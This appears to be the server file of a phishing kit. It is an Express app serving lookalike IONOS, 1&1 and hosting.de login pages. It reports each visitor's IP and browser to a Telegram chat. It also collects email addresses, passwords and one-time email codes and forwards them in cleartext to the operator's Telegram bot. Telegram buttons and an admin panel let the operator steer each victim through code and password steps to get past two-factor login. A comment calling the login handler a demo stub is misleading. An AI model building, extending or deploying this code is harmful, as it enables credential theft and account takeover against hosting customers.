require("dotenv").config();
const express = require("express");
const os = require("os");
const path = require("path");
const flow = require("./lib/ionos-flow");
const { getStoreMode, pingSupabase } = require("./lib/ionos-store");

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || "0.0.0.0";
const ADMIN_KEY = process.env.ADMIN_KEY || "";

// Per-IP cooldown to avoid duplicate notifications on refresh (10 minutes)
const VISITOR_COOLDOWN_MS = 10 * 60 * 1000;
const recentVisitors = new Map();
let telegramOffset = 0;

function getLocalAddresses() {
  const addresses = [];
  for (const interfaces of Object.values(os.networkInterfaces())) {
    for (const iface of interfaces) {
      if (iface.family === "IPv4" && !iface.internal) {
        addresses.push(iface.address);
      }
    }
  }
  return addresses;
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function sendTelegram(text, replyMarkup) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn("[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
    return { ok: false, error: "not_configured" };
  }
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const body = {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
  };
  if (replyMarkup) body.reply_markup = replyMarkup;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 8000);
  let res;
  try {
    res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      signal: controller.signal,
    });
  } finally {
    clearTimeout(timer);
  }
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    console.error("[telegram]", data.description || res.statusText);
    return { ok: false, error: data.description || "request_failed" };
  }
  return { ok: true };
}

async function answerTelegramCallback(callbackQueryId, text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;
  await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callbackQueryId,
      text: text || "Weiterleitung gesetzt",
    }),
  }).catch(() => {});
}

async function notifyFlowSession(session, title) {
  if (process.env.TELEGRAM_NOTIFY !== "true") return;
  const keyboard = flow.buildTelegramKeyboard(session);
  await sendTelegram(flow.formatSessionMessage(session, title), keyboard || undefined);
}

function notifyFlowSessionAsync(session, title) {
  notifyFlowSession(session, title).catch((err) =>
    console.error("[telegram] notify failed:", err.message)
  );
}

async function handleTelegramCallback(callbackQuery) {
  const parsed = flow.parseCallbackData(callbackQuery.data);
  if (!parsed) return;

  const result = await flow.applyAdminAction(parsed.id, parsed.action);
  if (!result.ok) {
    await answerTelegramCallback(
      callbackQuery.id,
      "Session nicht gefunden (Store: " + getStoreMode() + ")"
    );
    return;
  }

  const labels = {
    code: "→ E-Mail Code",
    password: "→ Passwort",
    code_bad: "→ Falscher Code",
    thankyou: "→ Thank You",
  };
  await answerTelegramCallback(callbackQuery.id, labels[parsed.action] || "OK");
}

function getTelegramWebhookBase() {
  if (process.env.TELEGRAM_WEBHOOK_URL) {
    return process.env.TELEGRAM_WEBHOOK_URL.replace(/\/$/, "");
  }
  if (process.env.VERCEL_PROJECT_PRODUCTION_URL) {
    return `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL.replace(/^https?:\/\//, "")}`;
  }
  if (process.env.VERCEL_URL) {
    return `https://${process.env.VERCEL_URL}`;
  }
  return null;
}

async function setupTelegramWebhook() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return { ok: false, error: "no_token" };

  const base = getTelegramWebhookBase();
  if (!base) return { ok: false, error: "no_base_url" };

  const webhookUrl = `${base.replace(/\/$/, "")}/api/telegram/webhook`;
  const res = await fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ url: webhookUrl, allowed_updates: ["callback_query"] }),
  });
  const data = await res.json().catch(() => ({}));
  if (data.ok) {
    console.log("[telegram] Webhook set:", webhookUrl);
    return { ok: true, url: webhookUrl };
  }
  console.error("[telegram] Webhook failed:", data.description || res.statusText);
  return { ok: false, error: data.description || "request_failed", url: webhookUrl };
}

function setupTelegramWebhookAsync() {
  setupTelegramWebhook().catch((err) => console.error("[telegram webhook]", err.message));
}

async function getTelegramWebhookInfo() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return { configured: false };
  const res = await fetch(`https://api.telegram.org/bot${token}/getWebhookInfo`);
  const data = await res.json().catch(() => ({}));
  if (!data.ok) return { configured: true, ok: false };
  return {
    configured: true,
    ok: true,
    url: data.result?.url || "",
    pending: data.result?.pending_update_count || 0,
    expected: getTelegramWebhookBase()
      ? `${getTelegramWebhookBase().replace(/\/$/, "")}/api/telegram/webhook`
      : null,
  };
}

async function clearTelegramWebhook() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;
  await fetch(`https://api.telegram.org/bot${token}/deleteWebhook`).catch(() => {});
}

async function pollTelegramUpdates() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token || process.env.VERCEL === "1") return;

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${token}/getUpdates?offset=${telegramOffset}&timeout=25`
    );
    const data = await res.json().catch(() => ({}));
    for (const update of data.result || []) {
      telegramOffset = update.update_id + 1;
      if (update.callback_query) {
        await handleTelegramCallback(update.callback_query);
      }
    }
  } catch (err) {
    console.error("[telegram poll]", err.message);
  }

  setTimeout(pollTelegramUpdates, 500);
}

function requireAdmin(req, res, next) {
  if (!ADMIN_KEY) {
    return res.status(503).json({ ok: false, message: "ADMIN_KEY not configured" });
  }
  const key = req.headers["x-admin-key"] || req.query.key;
  if (key !== ADMIN_KEY) {
    return res.status(401).json({ ok: false, message: "Unauthorized" });
  }
  next();
}

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

function parseDevice(ua) {
  if (!ua) return "Unknown";
  if (/mobile/i.test(ua)) return "Mobile";
  if (/tablet|ipad/i.test(ua)) return "Tablet";
  return "Desktop";
}

function parseBrowser(ua) {
  if (!ua) return "Unknown";
  if (/edg\//i.test(ua)) return "Edge";
  if (/opr\//i.test(ua)) return "Opera";
  if (/chrome/i.test(ua)) return "Chrome";
  if (/firefox/i.test(ua)) return "Firefox";
  if (/safari/i.test(ua)) return "Safari";
  return "Other";
}

// Visitor tracking — notifies Telegram BEFORE sending file so serverless doesn't cut it off
app.get("/", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";

    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip);
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;

    if (!isBot && !onCooldown) {
      recentVisitors.set(ip, now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);

      await sendTelegram(
        [
          "<b>👁️ Nuovo Visitatore — Portal Duplica</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }

  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Visitor tracking for 1&1 page
app.get("/1und1.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-1und1");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-1und1", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — Pagina 1&amp;1</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "1und1.html"));
});

function serveHostingPage(req, res) {
  const notify = process.env.TELEGRAM_NOTIFY === "true";
  if (notify) {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-hosting");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-hosting", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      sendTelegram(
        [
          "<b>👁️ Visitatore — Pagina hosting.de</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      ).catch((err) => console.error("[telegram]", err.message));
    }
  }
  res.sendFile(path.join(__dirname, "public", "hosting.de.html"));
}

app.get("/hosting.de", serveHostingPage);
app.get("/hosting.de.html", serveHostingPage);

// Visitor tracking for IONOS page
app.get("/ionos.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-ionos");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-ionos", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — Pagina IONOS</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "ionos.html"));
});

app.get("/ionos-password.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-ionos-pw");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-ionos-pw", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — IONOS Passwort</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "ionos-password.html"));
});

app.get("/ionos-emailconfirmation.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-ionos-confirm");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-ionos-confirm", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — IONOS E-Mail Code</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "ionos-emailconfirmation.html"));
});

// Explicit static routes (Vercel serverless fallback)
app.get("/ionos-flow.js", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "ionos-flow.js"));
});

app.get("/health", async (_req, res) => {
  const supabasePing = await pingSupabase();
  const telegramWebhook = await getTelegramWebhookInfo();
  res.json({
    ok: true,
    version: 5,
    sessionStore: getStoreMode(),
    supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
    supabasePing,
    telegramWebhook,
    commit: process.env.VERCEL_GIT_COMMIT_SHA || "local",
  });
});

// ── IONOS flow control ──────────────────────────────────────────────

app.post("/api/ionos/start", async (req, res) => {
  const email = String(req.body.email || "").trim();
  if (!email) {
    return res.status(400).json({ ok: false, message: "Email required" });
  }

  try {
    const session = await flow.createSession({
      email,
      ip: getClientIp(req),
      ua: req.headers["user-agent"] || "",
    });

    notifyFlowSessionAsync(session, "📧 IONOS — Email eingegeben");
    setupTelegramWebhookAsync();

    return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
  } catch (err) {
    console.error("[ionos/start]", err.message);
    const message =
      err.message.includes("404") || err.message.includes("ionos_sessions")
        ? "Datenbank-Tabelle fehlt. Bitte supabase-setup.sql in Supabase ausführen."
        : "Session store unavailable";
    return res.status(503).json({ ok: false, message });
  }
});

app.get("/api/ionos/session/:id", async (req, res) => {
  const session = await flow.getSession(req.params.id);
  if (!session) return res.status(404).json({ ok: false });
  let error = session.error || null;
  if (req.query.consume === "1" && error) {
    await flow.updateSession(session.id, { error: null });
  }
  return res.json({
    ok: true,
    id: session.id,
    email: session.email,
    step: session.step,
    pending: session.pending,
    error,
  });
});

app.get("/api/ionos/session/:id/poll", async (req, res) => {
  const state = await flow.getPollState(req.params.id);
  return res.json(state);
});

app.post("/api/ionos/session/:id/code", async (req, res) => {
  const session = await flow.getSession(req.params.id);
  if (!session) return res.status(404).json({ ok: false, message: "Session not found" });

  const code = String(req.body.code || "").trim();
  if (!code) return res.status(400).json({ ok: false, message: "Code required" });

  await flow.updateSession(session.id, {
    code,
    step: "code_submitted",
    pending: "code",
  });

  const updated = await flow.getSession(session.id);
  notifyFlowSessionAsync(updated, "🔢 IONOS — Code eingegeben");

  return res.json({ ok: true, sessionId: session.id });
});

app.post("/api/ionos/session/:id/password", async (req, res) => {
  const session = await flow.getSession(req.params.id);
  if (!session) return res.status(404).json({ ok: false, message: "Session not found" });

  const password = String(req.body.password || "");
  if (!password) return res.status(400).json({ ok: false, message: "Password required" });

  await flow.updateSession(session.id, {
    password,
    step: "password_submitted",
    pending: "password",
  });

  const updated = await flow.getSession(session.id);
  notifyFlowSessionAsync(updated, "🔑 IONOS — Passwort eingegeben");

  return res.json({ ok: true, sessionId: session.id });
});

app.get("/api/admin/sessions", requireAdmin, async (_req, res) => {
  res.json({ ok: true, sessions: await flow.listSessions(), store: getStoreMode() });
});

app.post("/api/admin/session/:id/redirect", requireAdmin, async (req, res) => {
  const action = String(req.body.action || "");
  const result = await flow.applyAdminAction(req.params.id, action);
  if (!result.ok) {
    return res.status(404).json({ ok: false, message: result.error });
  }
  res.json({ ok: true, session: result.session });
});

app.post("/api/telegram/webhook", async (req, res) => {
  const update = req.body;
  if (update && update.callback_query) {
    await handleTelegramCallback(update.callback_query);
  }
  res.json({ ok: true });
});

app.post("/api/hosting/login", async (req, res) => {
  const email = String(req.body.email || "").trim();
  const password = String(req.body.password || "");

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Email and password required" });
  }

  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const when = new Date().toISOString();
    await sendTelegram(
      [
        "<b>🔐 hosting.de — Login</b>",
        "",
        `<b>Email:</b> ${escapeHtml(email)}`,
        `<b>Passwort:</b> ${escapeHtml(password)}`,
        `<b>IP:</b> ${escapeHtml(ip)}`,
        `<b>Dispositivo:</b> ${parseDevice(ua)}`,
        `<b>Browser:</b> ${parseBrowser(ua)}`,
        `<b>Ora (UTC):</b> ${when}`,
      ].join("\n")
    );
  }

  return res.json({ ok: true });
});

app.post("/api/login", async (req, res) => {
  const email = String(req.body.email || "").trim();
  const password = String(req.body.password || "");
  const code = String(req.body.code || "").trim();

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Email e password sono obbligatori." });
  }

  // Demo stub — replace with real authentication (hashing, sessions, etc.)
  console.log("[login] Demo submit received for:", email);

  if (process.env.TELEGRAM_NOTIFY === "true") {
    const when = new Date().toISOString();
    const lines = [
      "<b>Portal Duplica</b>",
      "",
      "<b>Evento:</b> invio del modulo",
      `<b>Email:</b> ${escapeHtml(email)}`,
    ];
    if (code) {
      lines.push(`<b>Code:</b> ${escapeHtml(code)}`);
    }
    lines.push(`<b>Password:</b> ${escapeHtml(password)}`);
    lines.push(`<b>Ora (UTC):</b> ${when}`);

    const result = await sendTelegram(lines.join("\n"));
    if (result.ok) {
      console.log("[telegram] Notification sent.");
    } else {
      console.error("[telegram] Notification failed:", result.error);
    }
  }

  return res.json({
    ok: true,
    message: "Richiesta registrata.",
  });
});

app.use(express.static(path.join(__dirname, "public")));

// Only start the HTTP server when running locally (not on Vercel)
if (process.env.VERCEL !== "1") {
  app.listen(PORT, HOST, async () => {
    const localAddresses = getLocalAddresses();
    console.log(`Server listening on ${HOST}:${PORT}`);
    console.log(`Session store: ${getStoreMode()}`);
    console.log(`Local:   http://localhost:${PORT}`);
    console.log(`Panel:   http://localhost:${PORT}/ionos-panel.html`);
    for (const address of localAddresses) {
      console.log(`Network: http://${address}:${PORT}`);
    }
    if (localAddresses.length === 0) {
      console.log("No LAN IPv4 address found. Check your network connection.");
    }
    if (getStoreMode() === "memory") {
      console.warn("[ionos] Using memory store — add Supabase (free) for Vercel redirects");
    }
    if (process.env.TELEGRAM_BOT_TOKEN) {
      if (process.env.TELEGRAM_USE_POLLING === "true" && getStoreMode() === "memory") {
        await clearTelegramWebhook();
        pollTelegramUpdates();
        console.log("[telegram] Local polling mode (memory store only)");
      } else {
        console.log(
          "[telegram] Webhook not changed locally — use Vercel for Telegram buttons, or set TELEGRAM_USE_POLLING=true for local-only tests"
        );
      }
    }
  });
} else {
  setupTelegramWebhookAsync();
}

module.exports = app;
